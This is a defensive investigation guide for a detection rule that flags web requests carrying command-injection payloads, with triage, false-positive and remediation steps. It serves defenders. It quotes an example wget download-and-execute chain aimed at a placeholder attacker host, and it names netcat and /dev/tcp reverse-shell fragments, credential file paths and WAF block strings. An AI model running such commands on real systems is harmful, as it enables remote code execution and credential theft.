---
applies_to:
  stack: ga all
  serverless:
    security: ga all
products:
  - id: security
  - id: cloud-serverless
description: Investigation guide for the "Web Server Potential Command Injection Request" prebuilt detection rule.
---

# Web Server Potential Command Injection Request

 ## Triage and analysis

> **Disclaimer**:
> This investigation guide was created using generative AI technology and has been reviewed to improve its accuracy and relevance. While every effort has been made to ensure its quality, we recommend validating the content and adapting it to suit your specific environment and operational needs.

### Investigating Web Server Potential Command Injection Request

This rule flags web requests whose URLs embed command-execution payloads—interpreter flags, shell invocations, netcat reverse shells, /dev/tcp, base64, credential file paths, downloaders, and suspicious temp or cron paths. It matters because attackers use low-volume, successful (200) requests to trigger server-side command injection and gain persistence or control without obvious errors. Example: a crafted query executes bash -c 'wget http://attacker/rev.sh -O /tmp/r; chmod +x /tmp/r; /tmp/r' from the web app, yielding a 200 while dropping and running a payload.

### Possible investigation steps

- Pull the raw HTTP request or PCAP, repeatedly URL-decode and base64-decode parameters, and extract shell metacharacters, commands, IP:port pairs, file paths, and download URLs to infer execution intent.
- Time-correlate the request with host telemetry for web-server-owned child processes, file writes in /tmp, /dev/shm, or web roots, cron modifications, and new outbound connections from the same host.
- Pivot on the source IP and user-agent to find related requests across other hosts/endpoints, identify scan-to-exploit sequencing and success patterns, and enact blocking or rate limiting if malicious.
- Map the targeted route to its backend handler and review code/config to see if user input reaches exec/system/os.popen, templating/deserialization, or shell invocations, then safely reproduce in staging to validate exploitability.
- If the payload references external indicators, search DNS/proxy/firewall telemetry for matching egress, retrieve and analyze any downloaded artifacts, and hunt for the same indicators across the fleet.

### False positive analysis

- A documentation or code-rendering page that echoes command-like strings from query parameters (e.g., "bash -c", "python -c", "curl", "/etc/passwd") returns 200 while merely displaying text, so the URL contains payload keywords without any execution.
- A low-volume developer or QA test to a sandbox route includes path or query values like "/dev/tcp/", "nc 10.0.0.1 4444", "busybox", or "chmod +x" to validate input handling, the server returns 200 and the rule triggers despite no server-side execution path consuming those parameters.

### Response and remediation

- Block the offending source IPs and User-Agents at the WAF/reverse proxy, add virtual patches to drop URLs containing 'bash -c', '/dev/tcp', 'base64 -d', 'curl' or 'nc', and remove the targeted route from the load balancer until verified safe.
- Isolate the impacted host from the network (at minimum egress) if the web service spawns child processes like bash/sh/python -c, creates files in /tmp or /dev/shm, modifies /etc/cron.*, or opens outbound connections to an IP:port embedded in the request.
- Acquire volatile memory and preserve access/error logs and any downloaded script before cleanup, then terminate malicious child processes owned by nginx/httpd/tomcat/w3wp, delete dropped artifacts (e.g., /tmp/*, /dev/shm/*, suspicious files in the webroot), and revert cron/systemd or SSH key changes.
- Rotate credentials and tokens if /etc/passwd, /etc/shadow, or ~/.ssh paths were targeted, rebuild the host or container from a known-good image, patch the application and dependencies, and validate clean startup with outbound traffic restricted to approved destinations.
- Immediately escalate to the incident commander and legal/privacy if remote command execution is confirmed (evidence: web-server-owned 'bash -c' or 'python -c' executed, curl/wget download-and-execute, or reverse shell to an external IP:port) or if sensitive data exposure is suspected.
- Harden by enforcing strict input validation, disabling shell/exec functions in the runtime (e.g., PHP disable_functions and no shell-outs in templates), running under least privilege with noexec,nodev /tmp and a read-only webroot, restricting egress by policy, and deploying WAF rules and host sensors to detect these strings and cron/webshell creation.

